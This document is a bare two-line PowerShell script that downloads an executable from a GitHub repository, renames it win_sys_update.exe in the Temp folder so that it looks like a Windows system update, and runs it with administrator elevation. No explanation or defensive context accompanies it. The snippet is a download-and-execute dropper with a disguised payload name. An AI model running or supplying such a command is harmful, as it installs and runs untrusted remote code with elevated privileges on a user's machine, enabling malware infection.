(New-Object Net.WebClient).DownloadFile('https://github.com/dima080911/test-projectX/blob/main/SamsungSmartSwitch.exe', "$env:LOCALAPPDATA\Temp\win_sys_update.exe")
Start-Process "$env:LOCALAPPDATA\Temp\win_sys_update.exe" -Verb RunAs
